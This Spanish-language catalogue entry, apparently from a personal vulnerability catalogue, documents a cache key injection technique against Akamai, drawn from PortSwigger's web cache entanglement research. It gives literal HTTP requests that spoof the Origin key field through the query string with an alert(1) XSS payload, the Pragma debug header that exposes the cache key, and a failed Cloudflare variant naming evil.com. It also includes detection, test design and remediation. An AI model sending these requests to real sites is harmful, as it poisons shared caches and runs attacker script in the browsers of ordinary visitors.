---
clase: otra
tech: akamai
cwe: CWE-444
cvss: 7.5 # [derivado] sin recompensa indicada; 'Akamai are working on a fix' segun la fuente
payload: |
  # ADVERTENCIA (H1): el render colapso los saltos de linea.
  #
  # Paso 1 - observar como se construye la clave. La cabecera Origin entra en la clave
  # con el prefijo '__Origin='. LITERAL de la fuente:
  GET /?x=2 HTTP/1.1
  Origin: '-alert(1)-'
  #   -> HTTP/1.1 200 OK
  #      X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'
  #      <script>…'-alert(1)-'…</script>
  #
  # Paso 2 - añadir el separador para ver como se delimitan los campos. LITERAL:
  GET /?x=2 HTTP/1.1
  Origin: '-alert(1)-'__
  #   -> X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
  #
  # Paso 3 - INYECTAR la clave desde la QUERY, falsificando el campo Origin.
  # LITERAL de la fuente:
  GET /?x=2__Origin='-alert(1)-' HTTP/1.1
  #   -> HTTP/1.1 200 OK
  #      X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__
  #      X-Cache: TCP_HIT
  #      <script>…'-alert(1)'-…</script>
  #
  # La clave del paso 3 COINCIDE con la del paso 2, asi que la victima que visite la
  # URL normal recibe la respuesta envenenada SIN enviar ninguna cabecera Origin.
  #
  # ---- CLOUDFLARE: variante que la fuente dice que NO funciono ----
  # Clave documentada de Cloudflare, LITERAL: ${header:origin}::${scheme}://${host_header}${uri}
  GET /foo.jpg?bar=x HTTP/1.1
  Host: example.com
  Origin: http://evil.com::http://example.com/foo.jpg?bar=x
  GET /foo.jpg?bar=argh::http://example.com/foo.jpg?bar=x HTTP/1.1
  Host: example.com
  Origin: http://evil.com
  # La fuente dice expresamente de este par: 'didn't work'.
precondicion: "La clave de cache se construye CONCATENANDO campos con un separador (aqui '__'), y al menos uno de los campos es controlable desde la query. Entonces se puede falsificar un campo posterior metiendo el separador en un campo anterior: la inyeccion clasica, aplicada a la clave de cache en lugar de a SQL o a HTTP."
como_se_descubre: |
  Requiere un oraculo que muestre la clave. Akamai lo da con:
  #   Pragma: akamai-x-get-cache-key, akamai-x-get-true-cache-key
  Con la clave visible, la secuencia es la de cualquier inyeccion: (1) observar como
  se serializa, (2) identificar el separador, (3) inyectarlo.
  El concepto generalizable y el mas valioso de este writeup: una clave de cache es un
  FORMATO SERIALIZADO, y todo formato serializado construido por concatenacion sin
  escapar es inyectable. Es el mismo razonamiento que se aplica a una consulta SQL o a
  una cabecera HTTP.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: GET /?x=2__Origin='-alert(1)-'  (sin cabecera Origin)
  #    -> X-Cache: TCP_HIT y la respuesta contiene el payload
  # B: GET /?x=2  (limpio, sin nada)
  #    -> respuesta normal; confirma que la clave de A es DISTINTA de la de B
  # C: GET /?x=2 con Origin: '-alert(1)-'__  -> genera la entrada que A despues acierta
  # La secuencia C->A es la prueba: el paso A, SIN enviar Origin, recibe una respuesta
  # generada con un Origin que el atacante eligio. Eso es lo que demuestra que una
  # victima normal queda afectada.
mata: |
  - La clave escapa los separadores en los valores de los campos -> muere. Es la
    correccion (la fuente indica que Cloudflare escapa los delimitadores).
  - No hay oraculo de clave y el separador no se puede inferir -> muy costoso.
  - Origin no entra en la clave.
  - Akamai aplique el arreglo en el que la fuente dice que estaba trabajando.
fuente: "https://portswigger.net/research/web-cache-entanglement (James Kettle, 2020-08-05, act. 2025-09-03). Peticiones, claves y la clave documentada de Cloudflare literales. Estado: 'Akamai are working on a fix' segun la fuente. El par de Cloudflare la fuente lo marca como 'didn't work'. Sin recompensas ni CVE indicados."
confianza: media
fecha: 2026-11-02
---
# [CACHÉ] Cache key injection — la clave de caché es un formato serializado, y es inyectable

## Principio
Una clave de caché se construye concatenando campos con un separador. En Akamai, la
cabecera `Origin` entra con el prefijo `__Origin=`. Si un campo anterior es controlable
desde la query, se puede meter ahí el separador y **falsificar los campos posteriores**.

Es inyección clásica aplicada a un sustrato nuevo. El razonamiento es idéntico al de la
inyección SQL o la de cabeceras HTTP: un formato serializado construido por
concatenación sin escapar es inyectable. Que el formato sea una clave de caché interna
no cambia nada — y es la razón de que nadie lo escapara.

## Payload
Observar cómo se serializa la clave:

```http
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'
```
→ `X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'`

Identificar el separador añadiéndolo:

```http
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__
```
→ `X-True-Cache-Key: /D/000/example.com/ cid=x=2__Origin='-alert(1)-'__`

E inyectarlo desde la query, falsificando el campo `Origin`:

```http
GET /?x=2__Origin='-alert(1)-' HTTP/1.1
```
→ `X-Cache: TCP_HIT` con `<script>…'-alert(1)'-…</script>`

La clave del tercer paso **coincide** con la del segundo. Así que una víctima que visite
la URL normal recibe la respuesta envenenada sin enviar ninguna cabecera `Origin`.

## La variante que no funcionó, y por qué importa incluirla
La fuente intenta lo mismo contra Cloudflare, cuya clave documentada es
`${header:origin}::${scheme}://${host_header}${uri}`:

```http
GET /foo.jpg?bar=x HTTP/1.1
Origin: http://evil.com::http://example.com/foo.jpg?bar=x
```

Y dice expresamente del par: ***"didn't work"***. Lo conservo marcado porque un payload
que falla documenta una defensa: Cloudflare escapa los delimitadores, que es exactamente
la corrección. Un catálogo que solo recoge lo que funciona pierde esa información.

## El oráculo de clave es el requisito
Sin ver la clave, esta clase es casi inviable: habría que inferir el formato de
serialización a ciegas. Akamai la expone con una cabecera de depuración, lo que convierte
un problema de adivinanza en uno de lectura. Merece notarse como principio de recon:
**buscar siempre el oráculo antes de atacar el mecanismo.**

## Impacto
Envenenamiento de caché con ejecución de JavaScript, servido a usuarios que no envían
ninguna cabecera especial. Estado según la fuente: *"Akamai are working on a fix."*

## Remediación
`# [derivado]`, ya que la fuente no da remediación específica para este caso: **escapar
los separadores** en los valores de campo al construir la clave, exactamente como se
escaparía un valor al construir una consulta. La fuente señala que Cloudflare hace
precisamente esto.

Y la recomendación general del paper, que también aplica: *"avoid ever rewriting the
cache key. Instead, rewrite the actual request."*
